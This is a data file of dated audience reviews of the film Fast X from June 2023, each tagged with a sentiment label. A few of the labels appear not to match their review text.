"Jun 11, 2023",NEUTRAL,"This movie would have been great had Jason Momoa's role would have been more serious and making everything out of a joke! That annoyed me through the whole movie! Raymond Reigns the wrestler would have been ideal for Herman Reyes son. Otherwise, this would have been a very good movie!"
"Jun 11, 2023",NEUTRAL,"Despite the not so great reception this has gotten, I think it’s a fun movie and better than it’s predecessor F9.  Jason Momoa was over the top, but a great villain.  There are some wild and pretty amazing action sequences."
"Jun 11, 2023",NEGATIVE,"BANG, CRASH, EXPLOSION, SPRAY TAN, YAWN, END...I just spoiled the entire movie."
"Jun 11, 2023",NEGATIVE,They tried to fit too much in the movie. The ending was terrible.
"Jun 11, 2023",POSITIVE,"Definitely a must see if you followed the franchise. Enjoyed the subtle references to Paul Walkers passing. As promised in any franchise, go big or go home. Waiting for the next part.."
"Jun 11, 2023",POSITIVE,I loved everything about this movie. Since Fast 9 was full they definitely made up with this one!!!
"Jun 11, 2023",NEGATIVE,"A lot better than 9 but still ridiculous. They continue to make these ridiculous stunts, unnecessary revivals from the dead, and dumb story lines. Not even close to what the core of the franchise originally was. We never saw that in the first few movies and they are a world favorite. 

I gave it 2 stars because Jason mamoa portrayed he's character in such a funny and twisted way."
"Jun 11, 2023",POSITIVE,"Jason Momoas character was over the top excellent!  Love the cast and it is ultimately a visual high,"
"Jun 11, 2023",POSITIVE,better yhan expected
"Jun 11, 2023",POSITIVE,"Amazing movie, ending was a shocker for sure. Looking forward to Fast 11."
"Jun 11, 2023",POSITIVE,"Tons of action and twists of characters. Some predictable, some not.  A very enjoyable movie.  We can't wait for the next episodes."
"Jun 11, 2023",POSITIVE,"Toller Film, mit viel Action. Spannung pur vom Anfang bis zum Ende.
Sehr gute Unterhaltung mit guten Darstellern."
"Jun 11, 2023",POSITIVE,Action packed from beginning to end im a Gadt n Furious fan and will definitely seethe next install
"Jun 11, 2023",NEUTRAL,Hated the ending. Shouldn't be a cliff hanger with what was to be the last FAST movie! Lots of great action.
"Jun 11, 2023",NEUTRAL,"The action isn't as good as say mission impossible, mostly because it's not really believable. Jason Momoa and John Cena was the best part of this movie. There was a few funny moments. It's kind of hard to get emotional over characters who may or may not die if they always come back to life."
"Jun 10, 2023",NEGATIVE,I wish I got my money back
"Jun 10, 2023",POSITIVE,Great action!!! Really enjoyed this movie!! Definitely lived up to the series.
"Jun 10, 2023",POSITIVE,"The movie was just good ol fun to watch, if you're okay with over the top Hollywood stories. What made the movie great was quite unexpected for me. Personally, I'm not a huge fan of Momoa, but he absolutely killed it in this movie along with the other colorful personalities like John Cena, Tyrese and Ludacris. I haven't watched the last couple but I'll definitely watch the next one."
"Jun 10, 2023",POSITIVE,Jason Momoa was perfect
"Jun 10, 2023",NEGATIVE,"This movie is suppose to be about cars, racing, cops etc. The villain's character ruin the movie. His character does not belong in this movie he should stick to doing his aquaman movies. They are starting to make this like a Peter Pan movie with the villain smh."
"Jun 10, 2023",POSITIVE,I liked how it brought everyone back except Brian. It was full of action can't wait for the next one.
"Jun 10, 2023",NEGATIVE,"Except for the performance of Jason Momoa, this is a mess.  Too many set pieces that are marginally connected, the story is irritating because it is filled with cameos and stars adding nothing.  Fans will love it, i imagine.  Anyone who is only a little interested should keep away."
"Jun 10, 2023",NEGATIVE,Flogging a dead horse much
"Jun 10, 2023",POSITIVE,"Jason Mamoa is EVERYTHING in this movie, plus this film was fun to watch in addition to his performance. MUCH better than the last TWO. Once you accept that Dom Toretto and his team are actually witches or something with superhuman understanding of cars, explosions, physics, luck, and plot devices, you will be much better off to enjoy any of these films. It's what I do and I'm WAY happier for it (except for when they go to space in the previous films; spoiler alert: they DON'T do that here, thank God!)."
"Jun 10, 2023",POSITIVE,Action and on your seat cliff hanger Far as shot them up action films go a true to fashion man movie
"Jun 10, 2023",POSITIVE,"The movie was amazing. Jammed pack action throughout every scene. It had intense twists and turns that left you guessing. They included so many amazing surprises I wasnt ready for and alliances I couldnt have ever predicted. Not to mention the villain they chose, he is certifiably wacko but perfect for this series. Roller coaster ride of emotions and amazement and I loved every moment. Family for life and I cant wait to see Fast 11."
"Jun 10, 2023",POSITIVE,"Entering this particular film, my expectations were low, assuming they had exhausted all possibilities. However, upon watching it, I found myself reinvigorated with enthusiasm for the Fast franchise! Undoubtedly, it was packed full of guns, explosions, and fast cars, yet it was the narrative that genuinely captivated my attention once more."
"Jun 10, 2023",NEUTRAL,"OK! you should know what you are going to get with this series> But this one is a little too absurd, good guys crash into bad guys - bad guys cars are totaled, good guys car looks like it was in a fender bender. Good guys cars fly thru the air or off an airplane and the people and car are mostly fine. Too exaggerated"
"Jun 10, 2023",POSITIVE,"My initial thought,  this needs to be the last Fast movie. But after seeing Fast X, I changed my mind. My opinion Jason Momoa saved this sequel. Fast needed a new super villain who is in some way connected to the story time line. Fast X did a perfect job creating that  for Dante. The only thing I would take back from the movie is a little detail of Hans hair style is long and not short when he met Shaw again in the post ending credit. Overall, the mood and creative direction of Jasons ( Im DanteIm Shante) performance made this sequel fresh and enjoyable!"
"Jun 10, 2023",POSITIVE,I loved the movie. It was action-packed from beginning to end.
"Jun 10, 2023",POSITIVE,Ha donat moltes sorpreses i ha estat molt be
"Jun 10, 2023",NEUTRAL,"Este filme é muito divertido, mas não especialmente bom. Tudo bem, porque se você é fã desta série, acho que ficará feliz com o que receberá."
"Jun 10, 2023",NEGATIVE,it's not exciting or funny ... they need to stop making fast n furious movies
"Jun 10, 2023",NEGATIVE,Not at all what fast and furious is about. Vin Diesel is ruining this franchise.
"Jun 10, 2023",NEUTRAL,"'Fast X' is the latest addition of the Fast franchise, and the beginning of it's end.

SYNOPSIS: 'Over many missions and against impossible odds, Dom Toretto and his family have outsmarted and outdriven every foe in their path. Now, they must confront the most lethal opponent they've ever faced. Fueled by revenge, a terrifying threat emerges from the shadows of the past to shatter Dom's world and destroy everything -- and everyone -- he loves.'

The franchise has moved on so much from its origins and for many that's not something many they like. For me, I sit somewhere in the middle.

This film continues the franchise's mission to scale up and be bigger and louder than ever before. We're well beyond turning things up to 11 now, we're up about 15 at present. At times this film is a full throttle, all action, CGI layden roller coaster. Unfortunately though there's very little substance beyond that. The story is a mess and there are so many inconsistencies throughout the film it's painful. 

It's overlong and over the top, and this film starts to acknowledge how absurd the franchise has become. And that's a real problem.

I don't hate this film I just accept it for what it is, a big blockbuster of a mess of a film.

Buckle up, grab the popcorn and prepare to crash and burn.

6/10"
"Jun 10, 2023",NEUTRAL,"Fast X, the latest installment in the high-octane franchise, delivers another turbo-charged rush of jaw-dropping action and heart-pounding excitement. Buckle up, because this film takes the Fast and Furious series to new heights, leaving fans with their adrenaline levels at an all-time high.

From the very first scene, Fast X dives headfirst into a world of mind-boggling stunts, gravity-defying chases, and awe-inspiring vehicular warfare. The movie wastes no time, serving up a relentless barrage of breathtaking set pieces that will have you gripping your seat in awe.

The charismatic ensemble cast, led by the incomparable Vin Diesel, brings their A-game once again. Their chemistry and camaraderie shine through, injecting the film with both heart and humor amidst the chaos. Newcomers to the franchise make a memorable impact, seamlessly integrating into the adrenaline-fueled family dynamic.

Fast X not only excels in its exhilarating action sequences but also delves deeper into the personal stories of its characters. The film explores themes of loyalty, family, and sacrifice, providing emotional depth that resonates throughout. Amidst the tire-screeching madness, moments of genuine human connection remind us why we've grown to love these characters over the years.

Visually, Fast X is a marvel. The breathtaking cinematography captures every heart-stopping moment with precision, showcasing the grandeur and scale of the high-speed escapades. The seamless integration of practical effects and cutting-edge CGI enhances the immersive experience, blurring the line between reality and fantasy.

However, as with any film in a long-running franchise, some moments may feel familiar or predictable. While Fast X attempts to introduce new twists and turns, it does rely on certain tropes and formulaic elements that fans have come to expect. Nonetheless, the film's relentless energy and sheer spectacle make it easy to overlook these minor shortcomings.

Fast X is a rollercoaster ride of pure entertainment, delivering on its promise to provide an adrenaline rush like no other. It's a must-watch for fans of the franchise and action enthusiasts alike. So fasten your seat belts and prepare for a turbo-charged thrill ride that will leave you breathless."
"Jun 10, 2023",POSITIVE,Loved all the actors in it! Lots of action as always.
"Jun 10, 2023",POSITIVE,AMAZING 👏  Can't wait for part 11 👍
"Jun 10, 2023",NEGATIVE,That was the worst fast movie ever. I won't even bother seeing the continuation.  I mean the others were at least fun. This wasn't fun or make any sense.
"Jun 10, 2023",NEUTRAL,Mamoa the part of the movie !!
"Jun 10, 2023",NEUTRAL,So dumb and ridiculous that it becomes really fun.
"Jun 10, 2023",NEGATIVE,"How do these movies keep getting so much worse when they weren't very good to begin with? Lazy writing, terrible editing, and worst of all chubby aquaman is a useless and annoying villain."
"Jun 10, 2023",NEGATIVE,The worst movie I've ever seen in my entire life.
"Jun 10, 2023",POSITIVE,Great movie very intense there’s going to be another !
"Jun 10, 2023",NEUTRAL,I loved every fast and furious... this one didn't hold up to an ending of anything!
"Jun 10, 2023",POSITIVE,"Ass kicking great time!
fast cars, explosions, Vin Diesel,Jason Momoa!!
hands down the villain of the series❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️"
"Jun 10, 2023",POSITIVE,loved the way it brought back the focus on family and how it tied everything together
"Jun 10, 2023",NEGATIVE,"Lo peor que he visto en años, una bazofia"
"Jun 10, 2023",POSITIVE,"It was refreshing to see Jason Mamoa play a kooky character. A lot of CGI but if you just turn your brain off and just enjoy the ride, you will enjoy it."
"Jun 10, 2023",POSITIVE,Action packed Cliff hanger!!!  I loved it!!!!
"Jun 10, 2023",POSITIVE,"Jason Momoa was unexpectedly great with his Heath Ledger joker vibes, and Vin Diesel's son stole the show. I was pleasantly surprised.  This might be my favorite F&F thus far...and that fight scene with Michelle Rodriguez and Charlize Theron."
"Jun 10, 2023",NEUTRAL,"I truly believe that this movie had potential to be great, it had a lot of fun action scenes in a lot of excitement, but it just fell flat a lot

I'm not quite sure what the concept is anymore. Are they secret agents instead of just car drivers. The franchise has lost its entire meaning."
"Jun 10, 2023",POSITIVE,I enjoyed it better than l thought I would. Some outlandish stuff but that’s expected but l’d watch again
"Jun 10, 2023",POSITIVE,"A lot of action. Just need to watch it as a movie not real life. 
Torreto better not be dead !!!!"
"Jun 10, 2023",POSITIVE,The movie is a must-see! Tons of action yet a lot of emotional moments.
"Jun 10, 2023",POSITIVE,Bagus filmnya cuman ngegantung ceritanya
"Jun 10, 2023",POSITIVE,I loved everything about this movie great actors I miss Paul Walker
"Jun 10, 2023",POSITIVE,"Great movie, lots of action from beginning to the end."
"Jun 10, 2023",POSITIVE,Loved it Fast and Furious delivered a phenomenal movie. Super funny too.Loved all characters they brought back!!!
"Jun 10, 2023",NEUTRAL,This is one the best and most fun of the Fast and Furious sequels. Yet this is when critics and even most fans had enough. It made the less at the box office and the reviews were low. Jason Mamoa since Slumberland has learned to have more fun in his movies. He easily steals the show as the villain. 
"Jun 10, 2023",POSITIVE,It was so believable lol! Jason Momoa was excellent and witty..we really enjoyed his part. Those pigtail buns were hilarious!!!!
"Jun 10, 2023",POSITIVE,The movie was great but sad that it is two parts
"Jun 9, 2023",POSITIVE,"I did not feel the 2 hours, Part 2 must be three hours. Amazing."
"Jun 9, 2023",NEGATIVE,Did they use a script? They also need to hire a physics supervisor.
"Jun 9, 2023",NEGATIVE,"You can tell they had a big budget for this one, except the dialogues are cringy and cheesy. The missions are again over the top and Jason Momoa tried his hardest to make this franchise fresh again. Despite his best efforts, ended up being too long and a bit of a snoozefest for me"
"Jun 9, 2023",NEUTRAL,"There was just way too much going on,,, it was good,,, of course Ill watch the next,,, because it was left wide open for another,, an of course youll want to see what happens"
"Jun 9, 2023",NEGATIVE,horrible unless you like the series.
"Jun 9, 2023",POSITIVE,"This is true to past the Fast and Furious movies, full of action, fast cars, family dinner and plot twists. Only thing missing was the family prayer saying grace"
"Jun 9, 2023",POSITIVE,Mom loved the movie. Can’t wait for 11.
"Jun 9, 2023",NEGATIVE,This film was fun to watch but that was about it. Just a bit of fun. The acting was meh and the stunts were very crazy but ridiculous. One of the only few good things other than the action and cars was Jason Momoa.
"Jun 9, 2023",NEGATIVE,Not good.  The only person in this film who can act is Jason
"Jun 9, 2023",NEGATIVE,over the top bad axted even worse written movie
"Jun 9, 2023",NEGATIVE,This is trash. Vin diesel forgot how to act and the director forgot how to make a decent film. Don't waste your time. TRASH!!!!!!
"Jun 9, 2023",POSITIVE,"I do not understand the critics on here. 

I personally found the movie a cinematic masterpiece.
It was a great film to the sequel and blew my expectations. Jason momoa was brilliant in this, so funny. 
The original cast were amazing as always. Can't wait for part 2!"
"Jun 9, 2023",NEGATIVE,"This movie is bland even for the standards of the Fast and Furious franchise. Jason Momoa shines as a  Star among stadium lights, whenever he's on screen you forget how bad this movie is. My final takeaway is that it's impressive that they continue to make these movies, especially as Vin Diesels ""ability"" to act continues to become less and less believable."
"Jun 9, 2023",POSITIVE,"Fast X is a thrilling two-hour, 21-minute ride that takes you across multiple cities, from Los Angeles to Rome, Rio, Portugal, and London. Director Louis Leterrier makes the most of his budget, delivering exhilarating action scenes like a bomb bouncing through the streets of Rome and a massive vault being dragged through Rio. While it doesn't reach the same level of outlandishness as Fast 9's space stunt, the film still packs a punch. The story kicks off with a gripping flashback, pulling Dominic Toretto out of his peaceful life and into a collision with the vengeful Dante Reyes, son of a drug lord. Jason Momoa injects the film with a burst of energy, bringing a unique and intense performance. After over 20 years, the cast may not be as fast or furious, but Momoa's presence revitalizes the sequel."
"Jun 9, 2023",NEGATIVE,"What a mess of a movie. This franchise should of ended at fast 4 . Plot is terrible, it doesn’t even make sense."
"Jun 9, 2023",POSITIVE,I loved everything about the movie. It was very actioned packed. I never lost i tweets once!
"Jun 9, 2023",NEUTRAL,JASON MOMOA SMAHED IT! Can't wait to see you again in second part. New Fast & Furious The Legend Jason Momoa. You are the best.
"Jun 9, 2023",NEGATIVE,Well the aquamann was hilarious joke
"Jun 9, 2023",NEUTRAL,"If you're a fan of this franchise, you're bound to enjoy it. The film offers a good adventure filled with exciting action sequences. While the CGI may not be top-notch, it doesn't detract from the overall enjoyment. Although the pacing of the story may feel a bit fast, it's understandable given the circumstances. However, it would have been great if the ending had been more carefully crafted instead of feeling abruptly cut off."
"Jun 9, 2023",NEUTRAL,Good action other than that I feel like there running out of ideas of the storyline there's nothing different than any other fast movie they should have stop 3 movies ago .
"Jun 9, 2023",POSITIVE,"Love it.. well made and Jason M is excellent in his role.. love him but right here I was sitting and thinking this is not him.. his not that evil.. but he was.. and oh remember it's just a movie. 
Love the franchise and this is so much Fn'F and a tribute to Brian that his daughter has a role.
It is everything that you could and should expect from that team."
"Jun 9, 2023",NEGATIVE,I usually love watching Jason Momoa but he was not the right part for this role. Even scene he tried to act crazy just made us cringe. They really made a joke of the whole thing writing that character like that and just putting in whoever is famous at the time instead of casting who was fit for an already questionable role.
"Jun 9, 2023",POSITIVE,"This movie left me speechless. No movie out currently can even compart to Fast X. The cars man, THE CARS ARE AMAZE BALLS. I forget the name of the one bald guy but he was pretty cool i guess. His head was not as shiny as expect so that's my only flaw of this movie. Also who let this movie Cook HAHAHAHAHAH. Peace out girl scout."
"Jun 9, 2023",NEUTRAL,"Its a action pack movie from beginning to end which sucks,if you want to kill 2hrs go see it."
"Jun 9, 2023",POSITIVE,"Just when I thought the franchise was over , here comes Aquaman to save the day . He reminded me of a take on a Joker Character wow . Great movie"
"Jun 9, 2023",NEUTRAL,Good villain by Jason momoa enjoyable to watch good mix between comedy and action. A lot better than F9 and fast and furious 8
"Jun 9, 2023",POSITIVE,A must see The saga continues
"Jun 9, 2023",POSITIVE,Love the movie ready for the next one😀😄
"Jun 9, 2023",NEGATIVE,"2 stars just for Jason Momoa's performance. This movie overall, is one of the worsts in the entire franchise."
"Jun 9, 2023",NEGATIVE,I don’t like how it ended.
"Jun 9, 2023",POSITIVE,"Heard from a handful of others that Fast X was trash. I can honestly say they were dead wrong!! Action, Comedy, and a some sad scenes too. But overall definitely recommend."
"Jun 9, 2023",POSITIVE,"love the fast franchise! 
miss you Paul Walker🩵"
"Jun 9, 2023",NEGATIVE,"No hace falta mucho análisis
Es mala, mala con muchas ganas
Las actuaciones siempre fueron mediocres y siguen siendolo, la trama no tiene ni pies ni cabeza y los agujeros o errores de guión abundan"
"Jun 9, 2023",POSITIVE,"Action packed from start to finish. If you like the franchise, you'll need to see Fast X."
"Jun 9, 2023",NEGATIVE,"While Fast X started on a decent premise of relating things back to the furious family's greatest success (Fast 5) it lacked something it desperately needed... a decent script.  

The characters just conveniently do things to progress the story without any real depth, arc, motivation or development and that's a real shame considering the pool of talent that was in this film.  Plus the fact that the main cast talked this film up prior to it's release set expectations a little too high.  

Momoa's villian while interesting is so comical I can't really take him seriously and again I don't blame the actor, I think the problem was the script... the villain should have been more malevolent to justify a real threat to the Toretto's and the cliffhanger ending might have worked if he successfully kidnapped Dom and Mia's kids saving room for Fast 11.   Another thing is bringing back characters who are supposed to be dead with no explanation is lackluster not blockbuster.  A series that has been running as long as the Fast saga has a serious following and fans get attached to their heroes and mourn their fate, so if you bring them back without reason, then you kind of insult the story which is as insulting to the audience as well as the film itself.  I think overall the taste I had left in my mouth from watching this was the greed of the producers saying let's make more money.

For over two decades we have been watching Dom's family evolve, overcome and win against the most outrageous odds... the series should change it's name to The Far Fetched & The Furious. 

Well that's my rant, but I'll probably still go what's the remaining sequels hoping the writers rectify what they did wrong, kind of like what X-Men Days of Future Past did for X-Men The Last Stand.  Also shout out to the writer's who are on strike in the USA entertainment needs your contributions desperately."
"Jun 9, 2023",NEUTRAL,Repetition of the older movies
"Jun 8, 2023",POSITIVE,To be honest I like this movie jason is a great villan
"Jun 8, 2023",POSITIVE,excellent action features pack everything you can imagine is in that movie Jason Momoa killed it
"Jun 8, 2023",POSITIVE,Very good come back i did not really like fast 8 and fast 9 but when i sew the trailer for this film i really excited and when i went to go and watch the film i loved it i can't wait for the next film
"Jun 8, 2023",POSITIVE,Lots and lots of action and the cast of course
"Jun 8, 2023",POSITIVE,Lots of action. Fun to watch.
"Jun 8, 2023",POSITIVE,"The movie was very good, a little far fetched. But it was very exciting."
"Jun 8, 2023",NEUTRAL,Fun. Lots of amazing and out of this world action. A great summer action movie.
"Jun 8, 2023",POSITIVE,Amazing how they really kept it interesting in a fresh way. No too over the top with his super powers this time around lol
"Jun 8, 2023",POSITIVE,"Guter Film, leider macht etwas der neue Bösewicht die Handlung kaputt und nimmt in manchen Situationen die Spannung raus"
"Jun 8, 2023",POSITIVE,I love Fast 10 every Fast and furious movie I love them all
"Jun 8, 2023",POSITIVE,One of the best they've done the second part Will be great
"Jun 8, 2023",POSITIVE,Good film but there s not a final yet. It s fun to watch
"Jun 8, 2023",NEUTRAL,It was over the top In some of the action scenes. Not at the top of the Fast n Furious series. I thought this would be the final one but the ending doesn't dictate that premise .
"Jun 8, 2023",POSITIVE,"I can always rely on this franchise to give me what I desire from it.

'Fast X' is a great time. I adore the whole series and have done so since watching the opening entry of it as a teen, sure it has changed tremendously since those halcyonic days of 2001 (OK, I was like 5 then...) but my fondness and enjoyment of these films remains unchanged - quality entertainment!

I love the main cast, particularly those we've had since the beginning or thereabouts - from Vin Diesel and Michelle Rodriguez to Tyrese Gibson and Ludacris (I'm gonna need a spin-off with those two if you're reading, Universal!) to Sung Kang and Jordana Brewster (want more of the latter, but I get it's tricky with the absence of Paul Walker; who is still missed). I'll never tire (tyre?) of watching them together.

Away from those guys, the recurrence of the likes of Charlize Theron, John Cena and Nathalie Emmanuel is pleasant and the additions of Brie Larson and Jason Momoa are highly welcomed. I wasn't sure if Momoa was a bit too over the top in parts, but all in all he makes for a memorable antagonist - he certainly commits to the role!

The action continues to be absolutely bonkers and I continue to be absolutely onboard with everything and anything that is portrayed onscreen. The look of the film, the sound of the film... I dig it all to be honest. It's loud as heck, but that's exactly what I'd want from a 'Fast & Furious' flick. A film worth the admission fee, as usual.

Bring on 'Fast XI' or whatever they decide to call it. Apparently we're still getting another one after that, which I personally hope has its own sequel, which in turn has its sequel, followed by another seque... you get my point. I wanna be 105 and sat in the cinema watching another one of these.😂"
"Jun 8, 2023",POSITIVE,Loved the movie!! Loved all the action in it and loved the cliff hanger ending where we know there will be another movie coming!! Awesome movie!!
"Jun 8, 2023",NEGATIVE,Terrible story lines. I want a refund
"Jun 8, 2023",NEGATIVE,"Worst fast and furious to come out, Jason mamoa carried the movie but seemed out of place in this universe. Seemed like he was practicing and getting xp for Lobo rather than belonging in this franchise."
"Jun 8, 2023",POSITIVE,"Always great stunts and wow moments, 4 star b/c it was a basic storyline and I didnt care for the ending"
"Jun 8, 2023",POSITIVE,"GREAT ACTION love ALL the characters.  
""FAMILIA"""
"Jun 8, 2023",POSITIVE,Jason Mamoa made the movie a lot better his presence added something fun movie good action just sit back and enjoy
"Jun 8, 2023",NEGATIVE,"Same old, same old. 20 year of this! 🤯"
"Jun 8, 2023",POSITIVE,I know what I want when I go see a fast movie. Fast paced high-octane action and this more than delivers. Why do people go see them expecting Shakespeare level writing? Just enjoy the action. Definitely seeing it again.
"Jun 8, 2023",NEGATIVE,"Very mediocre, poor plot and movie abruptly ends instead of having the characters play live action rocket league for the first hour of the film they should have spent time on creating a conclusive end for the first part"
"Jun 8, 2023",POSITIVE,I cant wait to the next one.
"Jun 8, 2023",POSITIVE,"With this being the tenth movie I think we all knew what to expect. Toretto pulling off the impossible in, you guessed it, a dodge charger. We did get the iconic drag race but it was short lived. Although it’s not about the racing, let’s be honest it never was, this one will leave you feeling even older than you did when you started it. You’ll realize how far you can get in a twenty year saga and still be glued to your seat wanting another twenty more."
"Jun 8, 2023",NEGATIVE,Same old story and no real depth. They need to kill the franchise before it gets worse. The acting had no heart.
"Jun 8, 2023",POSITIVE,Dante is the best villain in the Fast Franchise!  Who will survive from the team to take him on?  Can’t wait for the completion of the fast saga.
"Jun 8, 2023",NEGATIVE,"After skipping a few Fast and Furious movies, I actually tried to watch Fast X. Now I remember why I stopped. These are so awful, cringy, and ""over the top"" doesn't even begin to describe how bad the acting is. The stunts are so absolutely unbelievable I can't even suspend my disbelief to just enjoy the action. More power to you if you like these, but yeesh... It's bad, really bad. More of the same terrible crap in this franchise that had a promising early run of the first 3 movies, then made a u-turn to complete garbage."
"Jun 8, 2023",POSITIVE,Really cool movie experience. The Villian was bad ass.. he was ahead of Dom every step of the way. He was twisted just like the Joker in a way. Can't wait to see the next movie.  🔥🔥🔥🔥🔥🔥
"Jun 8, 2023",NEGATIVE,"""This movie is not worth my mental health."" -Justin Lin"
"Jun 8, 2023",NEGATIVE,If you like watching every FAMILY member resurrect and fight the corniest villain (that makes Steven Segal look like Denzel Washington) of all time. This is the movie for you
"Jun 8, 2023",POSITIVE,I did not like the ending.
"Jun 8, 2023",POSITIVE,I thought this was going to be dumb like the last one but it was actually great! They really had me feeling like there was a real sense of danger throughout the whole movie.
"Jun 8, 2023",NEGATIVE,The movie bounces around too much and at times didn't make any sense. The actions scenes were too off the wall to be even possible. If you are bored and have nothing else to do then go and watch. But if there is a better movie playing go see that one.
"Jun 8, 2023",POSITIVE,Solid movie better than F8&9
"Jun 8, 2023",POSITIVE,"La ame, es una franquicia de la odias o la amas, Momoa uff el mejor villano"
"Jun 8, 2023",POSITIVE,"Wow, really enjoyed this movie! Definitely need more Jason Momoa in this kind of psycho villian role! The car scenes were great !"
"Jun 8, 2023",POSITIVE,"great as usual, action packed"
"Jun 8, 2023",POSITIVE,I damn and awesome for yet not finished but next will part 2 !
"Jun 8, 2023",NEUTRAL,"Always the same ending 
Inconclusive 
Action good as always"
"Jun 7, 2023",POSITIVE,"The movie is way better than 9 ,Jason Mamoa just delivers.  Of course there's plenty of ""fake stuff"" but it's a movie to be entertained by."
"Jun 7, 2023",POSITIVE,"It's good, definitely worth watching. If you liked the others you will like this one"
"Jun 7, 2023",NEGATIVE,"The story is very tired now. The plot is as disjointed  as a contortionist. Back and forth like 5 different movies. The CGI is overkill...IT NEVER STOPS! I must be the only one that thinks you need a story with a beginning, a middle, and a end."
"Jun 7, 2023",POSITIVE,Loved the action - can't wait for the next release.
"Jun 7, 2023",POSITIVE,I loved it and can't wait for the next one
"Jun 7, 2023",POSITIVE,Best movie and now need part 2
"Jun 7, 2023",NEGATIVE,"Such a terrible ending. Walked away feeling like I had been robbed and the seeing the thieves laughing at me.

Didn't think much of the last one either but so disappointed with this movie. 

Clearly just a money making project now. Well, definitely won't be spending money to watch any of these again."
"Jun 7, 2023",POSITIVE,The movie was so awesome!  I was going to pass until I saw all of the positive consumer reviews!  Definitely one of my favorite since Fast 5. They really took time to reconnect with each character which is why I love the franchise so much since Fast 5.  They veered from that in 9 but recovered big time in this one which still had many eye-popping stunts and cool effects but the story went much deeper.  I loved it and highly recommend it!
"Jun 7, 2023",POSITIVE,Like it because lot action car fighting is in different places awesome song  all actor great job in this movie fast x was best movie ever !!! Love it cool car in the movie
"Jun 7, 2023",NEUTRAL,"This is the first fast and furious I've ever watched, I think it was a bit corny and I felt like they were trying to max out the action by having so many characters with alot of different scenes and every second something happens which is good but also feels like the target audience was 12 year olds who love cars and dont care about actual quality. like the scene where the kid and his uncle got into a commercials plane storage space to get into a small plane to fly away, or the fact that the fighting scenes really resemble low cost WWE. Movie was good, seen worse. I would've gave it 3.5 starts but I expected alot more from the directors."
"Jun 7, 2023",NEGATIVE,"Rubbish movie, not realistic at all. Dom Torreto is like a superhero with super power."
"Jun 7, 2023",NEGATIVE,"It's not about cars anymore, only the first 3 were good."
"Jun 7, 2023",NEGATIVE,"The latest instalment of the Fast and Furious franchise, ""Fast X,"" takes the series to new heights of absurdity and ridiculousness. The days of street racing are long gone, replaced with spy-thriller superhero-like adventures that feature villains reminiscent of James Bond and Mission Impossible. This tenth movie in the 22-year-long franchise delivers more of what its predecessors have been serving up, with a finale that ups the thrills and brings back everyone who has appeared in the series and introduces new characters.

The film centres on the theme of, say it with me: FAMILY. The film doesn't have any subtext; characters say what they will do before they do it, providing some comic relief from the severe high-octane action. The movie opens with recycled footage from the fifth instalment, ""Fast Five,"" and somehow inserts Jason Momoa's character into it, suggesting that the director believes ""Fast Five"" was the last best film in the series. The antagonist of ""Fast Five,"" who had a son named Dante Reyes, is back for revenge. Over the past decade, he has been plotting his vengeance against Dominic Torretto, played by Vin Diesel. Cipher, played by Charlize Theron, appears at Dom's house injured and informs him of the imminent threat. Cipher has just fought her men who turned against her and knows that Dante is no ordinary villain. Using the ""enemy of my enemy is my friend"" trope, everyone, good and bad, teams up to take down this sociopathic, Heath Ledger's-Joker-like villain.

Their globe-trotting hunt takes them to Rome, where they fall into a trap set by Dante. A mission involving computer chips turns out to be a bomb, causing the team to become fugitives after they try to minimise casualties. Letty is caught and sent to a black site with Cipher while the agency is replaced by a new head, Aimes, who doesn't see eye to eye with the ""family."" Brie Larson joins the cast as Mr Nobody's daughter and assists the team. As the film progresses, more characters are introduced, from Jason Statham and Helen Mirren to Pete Davidson! The newcomers are solid additions, with Daniela Melchior providing a neat blast into the past and Alan Ritchson playing a double spy naturally. However, with such a large ensemble cast, some characters' roles are inevitably reduced or made negligible, but this is not true for the antagonist.

Jason Momoa plays Dante, a maniacal man willing to level cities to exact his revenge. Dressed in colourful outfits with a deranged personality, Dante plays the villain, knowing he will somehow be a part of the family eventually. He is not wrong, as seen with Cipher and Jakob. One comically unsettling scene shows him putting on nail polish and saying he has to ""tone down masculinity."" With the technology he has obtained from Cipher and his meticulously planned revenge over a decade, Dante is probably the most frightening and intimidating villain in the franchise.

Dante's revenge plan involves many cars and explosions, with each action sequence escalating rapidly and defying physics. The final dam scene is goofy, foolish, and nonsensical, but that's okay because the franchise has made it a norm. The movie doesn't end with a family barbecue, as the previous films have, but ends abruptly after 140 minutes. This is because ""Fast X"" is the beginning of the end, the start of a final trilogy to the Fast and Furious franchise.

In short, ""Fast X"" has all the familiar elements: cars, explosions, over-the-top action sequences, and a diverse ensemble cast. The film stays true to its themes of family and loyalty, and the villains are as dramatic as ever. With almost two and a half hours of pure entertainment and adrenaline rush, it's an excellent watch for franchise fans and those who enjoy mindless action flicks with some laughs. The franchise has genuinely evolved but ultimately, it still knows how to deliver what its fans want."
"Jun 7, 2023",POSITIVE,Awesome can't wait for the next one.
"Jun 7, 2023",POSITIVE,A lot of action and  laughter
"Jun 7, 2023",POSITIVE,Action packed and awesome
"Jun 7, 2023",POSITIVE,The film was very action packed with some sad moments and laughs. Great movie.
"Jun 7, 2023",POSITIVE,"This movie is purely made for entertainment, people often tend to forget that most of the movies are made for entertainment, yes the story is not that good, action scenes are more grounded and somewhat realistic in this movie. Villain actually made sense. This movie is getting a bit too much hate IMO. Its a fun movie to watch with your friends and ofcourse FAMILY. This movie is better than previous 2 ones"
"Jun 7, 2023",POSITIVE,I loved it. I can't wait for the next part.
"Jun 7, 2023",POSITIVE,Honestly I’m loving the storyline in this film. Was mad how they ended the movie haha. Wanted to see more.
"Jun 7, 2023",POSITIVE,"Sino hubiese sido por la actuacin de Jason Momoa , la pelcula hubiese sido  el primer gran desastre de la franquicia. Las persecuciones fueron exageradamente largas.,"
"Jun 7, 2023",POSITIVE,"When I watch any movie from this series I turn into a little kid again. Action movies are always pow and bam and wow. The Fast series has turned into something bigger than it originally was. Now it’s so ridiculous with explosions and defying stunts in addition to the cool vroom of every car in the movie. Ridiculous in the good way. The movie was sooo entertaining. Dante had to be my favorite character, he was so flamboyantly  unhinged and playful in his villain that I lit up every time he was on the screen. Okay thanks bye."
"Jun 7, 2023",NEUTRAL,I love fast and furious but I don’t like waiting 😜
"Jun 7, 2023",NEGATIVE,"Overall, Fast X feels like the same Fast movies all over again, but with some added cars and actors that fans always wanted to see slapped with a ""meh"" storyline"
"Jun 7, 2023",POSITIVE,I've only seen the first 2 so I'm not a big fan of the franchise. The difference between the first ones and his are huge. It's over the top for sure and I dig it. The best part of this movie is Jason Momoa. It's basically his debut as the Joker and he's amazing.
"Jun 7, 2023",POSITIVE,"Great movie, always our family favorite"
